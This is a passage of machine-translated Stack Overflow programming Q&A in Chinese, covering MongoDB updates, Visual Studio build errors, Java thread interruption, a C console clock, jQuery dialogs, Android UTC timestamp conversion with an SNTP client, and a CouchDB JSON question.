现有记录中唯一需要的是它的 _id，这两个秘密字段不需要加载或映射回您的 POCO 对象。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2016-06-17T12:51:43.650

可以在 Where 语句中添加更多条件。像这样：

```
var db = ReferenceTreeDb.Database;
var packageCol = db.GetCollection<Package>("dotnetpackage");
var filter = Builders<Package>.Filter.Where(_ => _.packageName == packageItem.PackageName.ToLower() && _.isLatestVersion);
var update = Builders<Package>.Update.Set(_ => _.isLatestVersion, false);
var options = new FindOneAndUpdateOptions<Package>();
packageCol.FindOneAndUpdate(filter, update, options); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2018-03-25T14:27:05.740

有同样的问题，因为我想为所有类型使用 1 个通用方法并且不想使用反射创建自己的实现，所以我最终得到了以下通用解决方案（简化为在一个方法中显示所有内容）：

```
Task<bool> Update(string Id, T item)
{
    var serializerSettings = new JsonSerializerSettings()
            {
                NullValueHandling = NullValueHandling.Ignore,
                DefaultValueHandling = DefaultValueHandling.Ignore
            };
    var bson = new BsonDocument() { { "$set", BsonDocument.Parse(JsonConvert.SerializeObject(item, serializerSettings)) } };
    await database.GetCollection<T>(collectionName).UpdateOneAsync(Builders<T>.Filter.Eq("Id", Id), bson);
} 
```

笔记：

*   确保所有不能更新的字段都设置为默认值。

*   如果您需要将字段设置为默认值，您需要使用 DefaultValueHandling.Include，或者为该更新编写自定义方法

*   当性能很重要时，使用编写自定义更新方法`Builders<T>.Update`

    PS：显然应该由 MongoDB .Net Driver 实现，但是我在文档中的任何地方都找不到它，也许我只是看错了方式。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-04-14T12:35:41.563

那么有很多方法可以更新`mongodb`.

下面是我选择更新 mongodb 集合中的字段值的最简单方法之一。

```
public string UpdateData()
        {               
            string data = string.Empty;
            string param= "{$set: { name:'Developerrr New' } }";
            string filter= "{ 'name' : 'Developerrr '}";
            try
            {  
               //******get connections values from web.config file*****
                var connectionString = ConfigurationManager.AppSettings["connectionString"];
                var databseName = ConfigurationManager.AppSettings["database"];
                var tableName = ConfigurationManager.AppSettings["table"];

                //******Connect to mongodb**********
                var client = new MongoClient(connectionString);
                var dataBases = client.GetDatabase(databseName);
                var dataCollection = dataBases.GetCollection<BsonDocument>(tableName);       

                //****** convert filter and updating value to BsonDocument*******
                BsonDocument filterDoc = BsonDocument.Parse(filter);
                BsonDocument document = BsonDocument.Parse(param);

                //********Update value using UpdateOne method*****
                dataCollection.UpdateOne(filterDoc, document);                   
                data = "Success";
            }
            catch (Exception err)
            {
                data = "Failed - " + err;
            }
            return data;    
        } 
```

**希望这会帮助你:)**

# asp.net - Visual Studio 2012 错误

> ID：14853367
> 
> 赞同：3
> 
> 时间：2013-02-13T12:16:05.863
> 
> 标签：asp.net, visual-studio-2012, compiler-errors

我在 Windows 8 PC 上使用 Visual Studio 2012。安装VS2012时我没有问题。

当我处理 ASP.NET c# 项目时，我通常使用“在资源管理器中查看”选项来调试项目。这使我能够更改背后的代码。

有时在构建并按 F5 重新加载页面后，我会遇到一些错误。这并不总是发生，但经常发生。

> 错误是：CS2021、CVT1100、CS1566...“找不到文件 'C:\Users\UserName\AppData\Local\Temp\Temporary ASP.NET Files\root\617be439\61539075\App_GlobalResources.iuxkzxdi.0。 CS'”
> 
> “C:\Users\UserName\AppData\Local\Temp\Temporary ASP.NET Files\root”始终是问题所在。有时它说找不到文件，其他人说访问被拒绝。

Visual Studio 可以工作，但是在错误消失之前一直按 F5 是很糟糕的。

谁能帮我？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T12:38:39.420

以管理员身份运行 VS2012。默认情况下，本地帐户对访问构建/临时位置有限制，并且会抛出此类错误。尝试发布网站时，您会遇到类似的问题。

因此，将VS 2012设置一次比较容易，并在属性中选中“以管理员身份运行程序”复选框以使其始终以“管理员”身份运行。

# android - Android Sip（Linphone 开源项目中缺少文件）

> ID：14853368
> 
> 赞同：1
> 
> 时间：2013-02-13T12:16:09.553
> 
> 标签：android

我正在开发一个项目，一个使用 android 中的 sip 堆栈免费进行视频通话的客户端。我搜索了一下，发现 linphone n 其他几个是基于 SIP 的开源项目。[我使用 git 从https://github.com/dmonakhov/linphone-android](https://github.com/dmonakhov/linphone-android)下载了 linphone 的代码。当我浏览它的代码时，我发现它缺少一些重要的核心文件，没有这些文件，代码就无法编译和运行。因为我是 android 的初学者，所以对它没有太多的了解，需要这些文件来更好地理解它。丢失文件的名称是：

1.  src/org/linphone/core/OnlineStatus.java

2.  src/org/linphone/core/LinphoneFriend.java

3.  src/org/linphone/core/LinphoneCore.java

4.  src/org/linphone/core/LinphoneCallLog.java

5.  src/org/linphone/core/LinphoneCall.java

以及完整的原生编程源代码。

如果有人可以帮助我一点点，请做..如果有人有这些文件或对此有任何想法，请告诉我..

提前感谢每个人.. :) 寻找一些积极的回应..

# java - 如何恢复正在等待资源的线程？

> ID：14853370
> 
> 赞同：1
> 
> 时间：2013-02-13T12:16:19.990
> 
> 标签：java, multithreading

如何中断/恢复资源等待线程回到其他工作？说，我的线程正在等待来自资源的响应，该资源挂起或未处于响应状态。我怎样才能恢复那个线程来做其他工作？

其他线程是否可以向等待线程发送异常，以便出现异常，它可以返回到它的其他工作？

更新 ：

我已经尝试过以下方式，但没有用。

我有超时线程，它将检查第一个线程等待的特定事务是否发生默认超时，如果是，则在第一个线程上触发中断（）调用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T12:29:29.713

答案取决于许多因素。中断线程的“正确”方法是使用 thread.interrupt() 方法。这要求线程的代码是协作的；它应该知道中断，或者通过处理可中断操作（例如等待或睡眠）抛出的InterruptedException，或者通过定期检查当前线程的中断标志。

然后，代码应该决定中断应该产生什么后果。通常，您希望线程在中断时优雅地终止。

我会检查您的阻塞操作是否具有内置的超时机制，而不是使用中断。例如，如果它在 obj.wait() 上被阻止，那么您可以改用 obj.wait(timeout) 。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:18:45.003

是的，你可以[中断](http://docs.oracle.com/javase/tutorial/essential/concurrency/interrupt.html)线程。使用 Thread.interrupt 机制，谷歌它。

# c - 如何使C中的数字时钟工作

> ID：14853373
> 
> 赞同：0
> 
> 时间：2013-02-13T12:16:25.723
> 
> 标签：c

如果你运行它，一个数字时钟将打开。它显示小时、分钟和秒，并突出显示当前时间。

我现在想要的是让它运行。添加一秒钟后，突出显示的数字应向右移动一个。明显地。

我只是不知道如何做到这一点，请帮助？

这是我现在拥有的代码：

```
#include <stdio.h>
#include <time.h>
#include <conio.h>
#include <unistd.h>
#include <stdlib.h>
#include <windows.h>
#include <math.h>

#define WHITE 15

int main()
{

    int uren, minuten, seconden;
        time_t ltime;
        struct tm *Tm;

        ltime   = time(NULL);
        Tm      = localtime(&ltime);

        uren        = Tm->tm_hour;
        minuten     = Tm->tm_min;
        seconden    = Tm->tm_sec;

    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 15);
    printf("Uren:\n");
    int i;
    for (i = 0; i < 24; i++) {
        if(uren == i){
                SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED);
            printf("%i ", i);
        }else {
                SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 15);
            printf("%i ", i);
        }

    }

    printf("\n\nMinuten:\n");
    int j;
    for(j = 0; j < 60; j++) {
        if(minuten == j){
                SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED);
            printf("%i ", j);
        }else{
                SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 15);
            printf("%i ", j);
        }
    }

    printf("\n\nSeconden:\n");
    int k;
    for(k = 0; k < 60; k++) {
        if(seconden == k){
                SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED);
            printf("%i ", k);
        }else{
                SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 15);
            printf("%i ", k);
        }
    }

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T12:46:15.063

因此，我认为您想要执行三个步骤：

1.  当时间改变时重复输出。
2.  返回屏幕顶部。
3.  在此过程中不要使用每一盎司的 CPU 能力。

第 1 步涉及在整个代码周围添加一个 while 循环。

第 2 步涉及使用[`SetConsoleCursorPosition`](http://msdn.microsoft.com/en-gb/library/windows/desktop/ms686025%28v=vs.85%29.aspx)函数。

第 3 步涉及调用`Sleep(250)`或类似的事情[你不想睡一整秒，但足够长的时间，代码不会用完所有的 CPU，只是为了检查时间是否改变了每毫秒）。您可能还应该检查当前时间是否与上次相同，然后不打印。

我个人也会通过将`printf("%i", i);`（等）移出 if/else 来简化所有输出 - 毕竟，双方都是一样的。事实上，我将一个变量设置为颜色，然后在 if/else 语句中同时调用if`SetConsoleTextAttribute`和`printf`之后，只需在 if/else 语句中设置`colour = WHITE`or即可。`colour = RED`

# hbase - HBase 不同的客户端

> ID：14853379
> 
> 赞同：2
> 
> 时间：2013-02-13T12:16:28.763
> 
> 标签：hbase, thrift, avro

我正在做一个项目，我想从 HBase 系统中读取数据。我读到有各种可用的 HBase 客户端，默认的 Java 客户端、Thrift、Avro 等。

现在我很困惑，如果我选择默认的 Java 客户端，那么我是否能够使用 thrift 客户端读取存储在 HBase 中的数据？

我想了解，如果我使用 thrift 客户端从 HBase 读取数据，那么它将使用 thrift 反序列化器将数据从二进制类型转换为适当的类型？如果这是真的，那么如果我使用 HBase 默认客户端读取，使用节俭客户端加载的数据将被损坏？

谢谢你的帮助！！～罗希特

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-14T21:30:00.293

如果您使用 Java 开发 HBase 应用程序，我建议使用原始 HBase API - 它比 Thrift、REST、Avro 等更强大。

Java HBase API 通过 Zookeepers 直接与 HBase 数据库通信。

如果您*不*使用 Java，那么您必须使用其他协议之一 - Thrift、REST、Avro 等。例如，Python 有一些用于 Thrift（我推荐 HappyBase）和 REST 的库。Ruby 和其他语言也是如此。

如果您使用 Java API（直接）插入数据，您将能够使用 Python 或 Ruby 上的 Thrift 检索完全相同的数据。您可能需要小心数据结构/格式（HBase 将所有内容都存储为字节），因此请小心存储字符串、整数、unicode 字符串等。

# jquery-mobile - jQuery.mobile.splitview 弹窗定位

> ID：14853380
> 
> 赞同：0
> 
> 时间：2013-02-13T12:16:34.470
> 
> 标签：jquery-mobile, jquery-plugins

我正在使用 jQuery.mobile [jQuery Mobile - Splitview](https://github.com/asyraf9/jquerymobile-splitview)的 splitview 插件。我使用 jQuery.mobile 弹出窗口作为在点击事件触发的上下文菜单。现在我正在打开popus

```
$("#myPopup").click(); 
```

其中 myPopup 是在 HTML 中定义的弹出窗口。

这样我可以打开弹出窗口，但我无法将弹出窗口定位到点击位置。有人有想法吗？

就像是

```
$( ".selector" ).popup( "open", {x:event.pageX, y: event.pageY} ); 
```

由于 splitview 插件而不起作用。没有这个插件，它可以完美运行。

（粗略地说，我知道，taphold 事件不包含有关位置的信息，这只是一个例子。我也用纯数字尝试过，但它也不起作用）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-18T10:11:47.110

好吧，我的解决方案并不漂亮，但它确实有效。在 HTML 文件中，我定义了新的 DIV，并在打开上下文菜单之前定位它。

```
$("#contextDiv").css({
    position: "absolute",
    top: contextMenuTapY,
    left: contextMenuTapX
}); 
```

然后我打开相对于这个 DIV 的上下文菜单

HTML：

```
<a href="#popupElement" id="aPopupElement" data-position-to="#contextDiv" data-rel="popup"></a> 
```

JS：

```
$("#aPopupElement").click(); 
```

# jquery - 如何在 JQuery 对话框中捕获 ESC 事件？

> ID：14853388
> 
> 赞同：8
> 
> 时间：2013-02-13T12:17:11.263
> 
> 标签：jquery, jquery-dialog

是否可以在 JQuery 对话框上为 ESC 键提供自定义处理程序？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-02-13T12:19:41.580

是的，这是可能的。

将`closeOnEscape`选项设置为并在对话框的处理程序中的元素上`false`注册您自己的处理程序。`keydown``.ui-dialog``dialogcreate`

```
$(element).dialog({
    create: function() {
       $(this).closest('.ui-dialog').on('keydown', function(ev) {
           if (ev.keyCode === $.ui.keyCode.ESCAPE) {
               ...
           }
       });
       ...
    },
    closeOnEscape: false,
    ...
}); 
```

见[http://jsfiddle.net/alnitak/EbnZr](http://jsfiddle.net/alnitak/EbnZr)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-06-27T16:37:21.410

我用另一种方式：

```
$(element).dialog({

    beforeClose: function(event) {
        if (event.keyCode === $.ui.keyCode.ESCAPE) {
            // ...
            return false;
        }
    }

}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-13T12:19:55.767

```
$(selector-for-dialog).keyup(function(e) {
    // ESC key
    if ( e.keyCode === 27 ) {
        // custom action
    }
}); 
```

# android - 如何在android中将UTC时间戳转换为设备本地时间

> ID：14853389
> 
> 赞同：49
> 
> 时间：2013-02-13T12:17:11.653
> 
> 标签：android, timestamp, utc

我需要将从服务器获取的 UTC 时间戳转换为本地设备时间。目前我的时间相差 5 小时。例如，当我发布到服务器时，发布时间是 5 小时前而不是一秒前。如何解决这个问题。谢谢

下面是我做的代码

```
long timestamp = cursor.getLong(columnIndex);
            CharSequence relTime = DateUtils
                    .getRelativeTimeSpanString(timestamp * 1000
                            + TimeZone.getDefault().getRawOffset(),
                            System.currentTimeMillis(),
                            DateUtils.MINUTE_IN_MILLIS);
            ((TextView) view).setText(relTime); 
```

* * *

## 回答 #1

> 赞同：69
> 
> 时间：2013-03-27T18:31:07.080

**爪哇：**

```
int offset = TimeZone.getDefault().getRawOffset() + TimeZone.getDefault().getDSTSavings();
long now = System.currentTimeMillis() - offset; 
```

**科特林：**

```
val offset: Int = TimeZone.getDefault().rawOffset + TimeZone.getDefault().dstSavings
val now: Long = System.currentTimeMillis() - offset 
```

* * *

## 回答 #2

> 赞同：52
> 
> 时间：2015-09-09T12:57:48.587

**将格式为“2011-06-23T15:11:32”的日期字符串转换为我们的时区。**

```
private String getDate(String ourDate)
{
    try
    {
        SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        formatter.setTimeZone(TimeZone.getTimeZone("UTC"));
        Date value = formatter.parse(ourDate);

        SimpleDateFormat dateFormatter = new SimpleDateFormat("MM-dd-yyyy HH:mm"); //this format changeable
        dateFormatter.setTimeZone(TimeZone.getDefault());
        ourDate = dateFormatter.format(value);

        //Log.d("ourDate", ourDate);
    }
    catch (Exception e)
    {
        ourDate = "00-00-0000 00:00";
    }
  return ourDate;
} 
```

* * *

## 回答 #3

> 赞同：45
> 
> 时间：2013-02-13T13:12:21.760

乍一看，您示例中的代码看起来不错。顺便说一句，如果服务器时间戳采用 UTC（即它是一个纪元时间戳），那么您不必应用当前时区偏移量。换句话说，如果服务器时间戳采用 UTC，那么您可以简单地获取服务器时间戳和系统时间 ( `System.currentTimeMillis()`) 之间的差异，因为系统时间采用 UTC（纪元）。

我会检查来自您服务器的时间戳是否符合您的预期。如果来自服务器的时间戳没有转换为您期望的日期（在本地时区），那么时间戳和当前系统时间之间的差异将不是您期望的。

用于`Calendar`获取当前时区。`SimpleDateFormatter`用当前时区初始化 a ；然后记录服务器时间戳并验证它是否是您期望的日期：

```
Calendar cal = Calendar.getInstance();
TimeZone tz = cal.getTimeZone();

/* debug: is it local time? */
Log.d("Time zone: ", tz.getDisplayName());

/* date formatter in local timezone */
SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
sdf.setTimeZone(tz);

/* print your timestamp and double check it's the date you expect */
long timestamp = cursor.getLong(columnIndex);
String localTime = sdf.format(new Date(timestamp * 1000)); // I assume your timestamp is in seconds and you're converting to milliseconds?
Log.d("Time: ", localTime); 
```

如果打印的服务器时间*不是*您所期望的，那么您的服务器时间*不是*UTC。

如果打印的服务器时间是您期望的日期，那么您不必对其应用 rawoffset。所以你的代码会更简单（减去所有调试日志）：

```
long timestamp = cursor.getLong(columnIndex);
Log.d("Server time: ", timestamp);

/* log the device timezone */
Calendar cal = Calendar.getInstance();
TimeZone tz = cal.getTimeZone();
Log.d("Time zone: ", tz.getDisplayName());

/* log the system time */
Log.d("System time: ", System.currentTimeMillis());

CharSequence relTime = DateUtils.getRelativeTimeSpanString(
    timestamp * 1000,
    System.currentTimeMillis(),
    DateUtils.MINUTE_IN_MILLIS);

((TextView) view).setText(relTime);
```

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2018-09-11T18:31:16.850

我用`Extension Functions`在`kotlin`

```
fun String.toDate(dateFormat: String = "yyyy-MM-dd HH:mm:ss", timeZone: TimeZone = TimeZone.getTimeZone("UTC")): Date {
    val parser = SimpleDateFormat(dateFormat, Locale.getDefault())
    parser.timeZone = timeZone
    return parser.parse(this)
}

fun Date.formatTo(dateFormat: String, timeZone: TimeZone = TimeZone.getDefault()): String {
    val formatter = SimpleDateFormat(dateFormat, Locale.getDefault())
    formatter.timeZone = timeZone
    return formatter.format(this)
} 
```

用法：

```
"2018-09-10 22:01:00".toDate().formatTo("dd MMM yyyy")

Output: "11 Sep 2018" 
```

笔记：

确保正确验证。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2016-08-10T09:45:30.550

我已经做了这样的事情来从 UTC 时间戳获取本地设备时区的日期。

```
private long UTC_TIMEZONE=1470960000;
private String OUTPUT_DATE_FORMATE="dd-MM-yyyy - hh:mm a"

getDateFromUTCTimestamp(UTC_TIMEZONE,OUTPUT_DATE_FORMATE); 
```

**这是功能**

```
 public String getDateFromUTCTimestamp(long mTimestamp, String mDateFormate) {
        String date = null;
        try {
            Calendar cal = Calendar.getInstance(TimeZone.getTimeZone("UTC"));
            cal.setTimeInMillis(mTimestamp * 1000L);
            date = DateFormat.format(mDateFormate, cal.getTimeInMillis()).toString();

            SimpleDateFormat formatter = new SimpleDateFormat(mDateFormate);
            formatter.setTimeZone(TimeZone.getTimeZone("UTC"));
            Date value = formatter.parse(date);

            SimpleDateFormat dateFormatter = new SimpleDateFormat(mDateFormate);
            dateFormatter.setTimeZone(TimeZone.getDefault());
            date = dateFormatter.format(value);
            return date;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return date;
    } 
```

**结果 ：**

```
12-08-2016 - 04:30 PM 
```

希望这对其他人有用。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2014-11-28T13:22:46.800

本地到 UTC

```
DateTime dateTimeNew = new DateTime(date.getTime(),
DateTimeZone.forID("Asia/Calcutta"));
SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
simpleDateFormat.setTimeZone(TimeZone.getTimeZone("UTC"));
String datetimeString = dateTimeNew.toString("yyyy-MM-dd HH:mm:ss");
long milis = 0;
try {
     milis = simpleDateFormat.parse(datetimeString).getTime();
} catch (ParseException e) {
   e.printStackTrace();
} 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2021-09-20T10:00:10.827

# *java.time*

`java.util`日期时间 API 及其格式化 API已`SimpleDateFormat`过时且容易出错。建议完全停止使用它们并切换到[现代 Date-Time API](https://www.oracle.com/technical-resources/articles/java/jf14-Date-Time.html) ^*。

**使用`java.time`现代日期时间 API 的解决方案：**

```
import java.time.Instant;
import java.time.LocalDateTime;
import java.time.ZoneId;

public class Main {
    public static void main(String[] args) {
        // A sample timestamp as Unix epoch (i.e. seconds from 01-01-1970T00:00:00 GMT)
        long epochSeconds = 1632131465L;

        // Note: Use Instant#ofEpochMilli in case you have timestamp in milliseconds
        Instant instant = Instant.ofEpochSecond(epochSeconds);
        System.out.println(instant);

        LocalDateTime ldt = LocalDateTime.ofInstant(instant, ZoneId.systemDefault());
        System.out.println(ldt);
    }
} 
```

**我的时区欧洲/伦敦的输出：**

```
2021-09-20T09:51:05Z
2021-09-20T10:51:05 
```

[`ONLINE DEMO`](https://ideone.com/lrWsdu)

An[`Instant`](https://docs.oracle.com/javase/8/docs/api/java/time/Instant.html)表示时间线上的一个瞬时点，通常以[UTC](https://www.timeanddate.com/worldclock/timezone/utc)时间表示。`Z`输出中的 是零时区偏移的时[区指示符](https://en.wikipedia.org/wiki/ISO_8601#Time_zone_designators)。它代表 Zulu 并指定`Etc/UTC`时区（时区偏移量为`+00:00`小时）。

**[从Trail: Date Time](https://docs.oracle.com/javase/tutorial/datetime/index.html)**了解有关现代日期时间 API 的更多信息。

* * *

^(* 出于任何原因，如果您必须坚持使用 Java 6 或 Java 7，则可以使用[***ThreeTen-Backport，***](http://www.threeten.org/threetenbp/)它将大部分*java.time*功能向后移植到 Java 6 和 7。如果您正在为 Android 项目和 Android API 工作level 仍然不符合 Java-8，请检查[Java 8+ APIs available through desugaring](https://developer.android.com/studio/write/java8-support-table)和[How to use ThreeTenABP in Android Project](https://stackoverflow.com/questions/38922754/how-to-use-threetenabp-in-android-project)。)

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2019-08-26T06:19:43.897

@prgDevelop 的答案在我的 Android Marsmallow 上返回 0。必须返回 7200000。这些更改使其正常工作：

```
int offset = TimeZone.getTimeZone(Time.getCurrentTimezone()).getRawOffset() + TimeZone.getTimeZone(Time.getCurrentTimezone()).getDSTSavings(); 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2021-04-27T21:24:34.740

我有一个类似的问题。只需将您的 UTC 时间戳设置为您的时区日历并格式化日期。无论时区如何，时间戳仍然相同。

```
val local = Calendar.getInstance()   // get your device timezone calendar
local.timeInMillis = <timestamp>

val sdf = SimpleDateFormat("dd/MM/yyyy HH:mm:ss")
val formatted = sdf.format(Date(local.timeInMillis)) 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2017-02-05T06:08:25.350

这可能对有相同要求的人有所帮助

```
private String getDate(long time){
        SimpleDateFormat formatter = new SimpleDateFormat("dd/MM/yyyy hh:mm a");
        String dateString = formatter.format(new Date(time));
        String date = ""+dateString;
        return date;
    } 
```

* * *

## 回答 #11

> 赞同：-1
> 
> 时间：2019-09-27T09:37:46.237

**它正在工作**

在你使用的地方调用这个方法

```
SntpClient client = new SntpClient();
if (client.requestTime("ntp.ubuntu.com", 30000)) {
  long now = client.getNtpTime();
  Date current = new Date(now);

  date2 = sdf.parse(new Date(current.getTime()).toString());
 // System.out.println(current.toString());
  Log.e(TAG, "testing SntpClient time current.toString() "+current.toString()+" , date2 = "+date2);
}

=====================================================   

import android.os.SystemClock;
import android.util.Log;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

/**
 * {@hide}
 *
 * Simple SNTP client class for retrieving network time.
 *
 * Sample usage:
 * <pre>SntpClient client = new SntpClient();
 * if (client.requestTime("time.foo.com")) {
 *     long now = client.getNtpTime() + SystemClock.elapsedRealtime() - client.getNtpTimeReference();
 * }
 * </pre>
 */
public class SntpClient
{
  private static final String TAG = "SntpClient";

  private static final int REFERENCE_TIME_OFFSET = 16;
  private static final int ORIGINATE_TIME_OFFSET = 24;
  private static final int RECEIVE_TIME_OFFSET = 32;
  private static final int TRANSMIT_TIME_OFFSET = 40;
  private static final int NTP_PACKET_SIZE = 48;

  private static final int NTP_PORT = 123;
  private static final int NTP_MODE_CLIENT = 3;
  private static final int NTP_VERSION = 3;

  // Number of seconds between Jan 1, 1900 and Jan 1, 1970
  // 70 years plus 17 leap days
  private static final long OFFSET_1900_TO_1970 = ((365L * 70L) + 17L) * 24L * 60L * 60L;

  // system time computed from NTP server response
  private long mNtpTime;

  // value of SystemClock.elapsedRealtime() corresponding to mNtpTime
  private long mNtpTimeReference;

  // round trip time in milliseconds
  private long mRoundTripTime;

  /**
   * Sends an SNTP request to the given host and processes the response.
   *
   * @param host host name of the server.
   * @param timeout network timeout in milliseconds.
   * @return true if the transaction was successful.
   */
  public boolean requestTime(String host, int timeout) {
    DatagramSocket socket = null;
    try {
      socket = new DatagramSocket();
      socket.setSoTimeout(timeout);
      InetAddress address = InetAddress.getByName(host);
      byte[] buffer = new byte[NTP_PACKET_SIZE];
      DatagramPacket request = new DatagramPacket(buffer, buffer.length, address, NTP_PORT);

      // set mode = 3 (client) and version = 3
      // mode is in low 3 bits of first byte
      // version is in bits 3-5 of first byte
      buffer[0] = NTP_MODE_CLIENT | (NTP_VERSION << 3);

      // get current time and write it to the request packet
      long requestTime = System.currentTimeMillis();
      long requestTicks = SystemClock.elapsedRealtime();
      writeTimeStamp(buffer, TRANSMIT_TIME_OFFSET, requestTime);

      socket.send(request);

      // read the response
      DatagramPacket response = new DatagramPacket(buffer, buffer.length);
      socket.receive(response);
      long responseTicks = SystemClock.elapsedRealtime();
      long responseTime = requestTime + (responseTicks - requestTicks);

      // extract the results
      long originateTime = readTimeStamp(buffer, ORIGINATE_TIME_OFFSET);
      long receiveTime = readTimeStamp(buffer, RECEIVE_TIME_OFFSET);
      long transmitTime = readTimeStamp(buffer, TRANSMIT_TIME_OFFSET);
      long roundTripTime = responseTicks - requestTicks - (transmitTime - receiveTime);
      // receiveTime = originateTime + transit + skew
      // responseTime = transmitTime + transit - skew
      // clockOffset = ((receiveTime - originateTime) + (transmitTime - responseTime))/2
      //             = ((originateTime + transit + skew - originateTime) +
      //                (transmitTime - (transmitTime + transit - skew)))/2
      //             = ((transit + skew) + (transmitTime - transmitTime - transit + skew))/2
      //             = (transit + skew - transit + skew)/2
      //             = (2 * skew)/2 = skew
      long clockOffset = ((receiveTime - originateTime) + (transmitTime - responseTime))/2;
      // if (false) Log.d(TAG, "round trip: " + roundTripTime + " ms");
      // if (false) Log.d(TAG, "clock offset: " + clockOffset + " ms");

      // save our results - use the times on this side of the network latency
      // (response rather than request time)
      mNtpTime = responseTime + clockOffset;
      mNtpTimeReference = responseTicks;
      mRoundTripTime = roundTripTime;
    } catch (Exception e) {
      if (false) Log.d(TAG, "request time failed: " + e);
      return false;
    } finally {
      if (socket != null) {
        socket.close();
      }
    }

    return true;
  }

  /**
   * Returns the time computed from the NTP transaction.
   *
   * @return time value computed from NTP server response.
   */
  public long getNtpTime() {
    return mNtpTime;
  }

  /**
   * Returns the reference clock value (value of SystemClock.elapsedRealtime())
   * corresponding to the NTP time.
   *
   * @return reference clock corresponding to the NTP time.
   */
  public long getNtpTimeReference() {
    return mNtpTimeReference;
  }

  /**
   * Returns the round trip time of the NTP transaction
   *
   * @return round trip time in milliseconds.
   */
  public long getRoundTripTime() {
    return mRoundTripTime;
  }

  /**
   * Reads an unsigned 32 bit big endian number from the given offset in the buffer.
   */
  private long read32(byte[] buffer, int offset) {
    byte b0 = buffer[offset];
    byte b1 = buffer[offset+1];
    byte b2 = buffer[offset+2];
    byte b3 = buffer[offset+3];

    // convert signed bytes to unsigned values
    int i0 = ((b0 & 0x80) == 0x80 ? (b0 & 0x7F) + 0x80 : b0);
    int i1 = ((b1 & 0x80) == 0x80 ? (b1 & 0x7F) + 0x80 : b1);
    int i2 = ((b2 & 0x80) == 0x80 ? (b2 & 0x7F) + 0x80 : b2);
    int i3 = ((b3 & 0x80) == 0x80 ? (b3 & 0x7F) + 0x80 : b3);

    return ((long)i0 << 24) + ((long)i1 << 16) + ((long)i2 << 8) + (long)i3;
  }

  /**
   * Reads the NTP time stamp at the given offset in the buffer and returns
   * it as a system time (milliseconds since January 1, 1970).
   */
  private long readTimeStamp(byte[] buffer, int offset) {
    long seconds = read32(buffer, offset);
    long fraction = read32(buffer, offset + 4);
    return ((seconds - OFFSET_1900_TO_1970) * 1000) + ((fraction * 1000L) / 0x100000000L);
  }

  /**
   * Writes system time (milliseconds since January 1, 1970) as an NTP time stamp
   * at the given offset in the buffer.
   */
  private void writeTimeStamp(byte[] buffer, int offset, long time) {
    long seconds = time / 1000L;
    long milliseconds = time - seconds * 1000L;
    seconds += OFFSET_1900_TO_1970;

    // write seconds in big endian format
    buffer[offset++] = (byte)(seconds >> 24);
    buffer[offset++] = (byte)(seconds >> 16);
    buffer[offset++] = (byte)(seconds >> 8);
    buffer[offset++] = (byte)(seconds >> 0);

    long fraction = milliseconds * 0x100000000L / 1000L;
    // write fraction in big endian format
    buffer[offset++] = (byte)(fraction >> 24);
    buffer[offset++] = (byte)(fraction >> 16);
    buffer[offset++] = (byte)(fraction >> 8);
    // low order bits should be random data
    buffer[offset++] = (byte)(Math.random() * 255.0);
  }
} 
```

# iphone - 使用字符“_”和“/”从 NSDictionary 制作 JSON

> ID：14853398
> 
> 赞同：1
> 
> 时间：2013-02-13T12:17:29.687
> 
> 标签：iphone, objective-c, json, couchdb

编辑2：我不再认为字典键中的“_”和“/”是问题所在。

编辑 3：我认为 JSON 不再是问题，也不是 HTTP POST 请求。我还不知道它到底是什么。

编辑4：解决了。数据元素必须是有效的 base64，否则 couch 会拒绝它。不知道那个。还不能选择我自己的答案。

我有一本要转换为 JSON 字符串的字典。这是我的字典的设置：

```
- (NSDictionary*) createDictionary
{
    NSMutableDictionary *room = [[NSMutableDictionary alloc] init];

    [room setObject:self.roomNumber forKey:@"roomNumber"];
    [room setObject:self.floor forKey:@"floor"];
    [room setObject:self.comment forKey:@"comment"];
    [room setObject:self.type forKey:@"type"];
    [room setObject:[NSNumber numberWithInt:self.status] forKey:@"status"];
    [room setObject:[[NSMutableDictionary alloc] init] forKey:@"_attachments"];

    NSMutableDictionary *attachments = [room objectForKey:[NSString stringWithFormat:@"_%@", @"attachments"]];
    [attachments setObject:[[NSMutableDictionary alloc] init] forKey:@"picture"];

    NSMutableDictionary *picture = [attachments objectForKey:@"picture"];
    [picture setObject:@"text/plain" forKey:@"content_type"];
    [picture setObject:@"BASE64" forKey:@"data"];

    NSLog(@"Room: %@", room);
    return room;
} 
```

问题是“_”和“/”字符。当我打印出字典时，它看起来像这样：

